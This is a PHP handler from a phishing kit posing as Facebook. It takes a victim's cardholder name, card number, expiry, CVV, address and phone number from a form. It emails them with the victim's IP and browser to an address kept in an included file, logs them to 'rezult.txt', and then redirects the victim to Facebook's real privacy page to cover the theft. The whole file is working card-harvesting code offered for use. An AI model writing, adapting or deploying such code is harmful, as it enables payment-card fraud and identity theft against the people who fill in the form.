<?php
include "to.php";
$CCName  = $_POST['CCName'];
$card_number= $_POST['card_number'];
$Month   = $_POST['Month'];
$Year   = $_POST['Year'];
$CVV     = $_POST['CVV'];
$Address = $_POST['Address'];
$City    = $_POST['City'];
$State   = $_POST['State'];
$ZipCode = $_POST['ZipCode'];
$Country = $_POST['Country'];
$PhoneNumber = $_POST['PhoneNumber'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Facebook-2 -------------
CCName : $CCName
card_number : $card_number
Month : $Month / Year : $Year
CVV : $CVV
Address : $Address
City : $City
State : $State
ZipCode : $ZipCode
Country : $Country
PhoneNumber : $PhoneNumber
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Credit Card ++| ".$IP."";
$MAIL_HEADER = "From: Facebook.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=https://www.facebook.com/privacy/explanation'>";exit;

?>
